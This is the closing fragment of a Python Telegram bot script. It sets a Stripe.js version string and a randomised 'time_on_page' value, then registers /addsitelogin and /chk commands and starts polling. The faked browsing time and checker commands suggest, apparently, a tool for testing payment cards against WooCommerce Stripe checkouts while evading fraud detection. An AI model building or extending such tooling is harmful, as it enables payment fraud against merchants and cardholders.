    application.bot_data['stripe_js_version'] = "v3_bot_wc_ajax_url_fix_1.7_paren_fix"
    application.bot_data['time_on_page'] = random.randint(15000, 25000)

    application.add_handler(CommandHandler("start", addsitelogin))
    application.add_handler(CommandHandler("addsitelogin", addsitelogin))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), route_text_message))

    logger.info("Bot started polling...")
    application.run_polling()

if __name__ == "__main__":
    main()
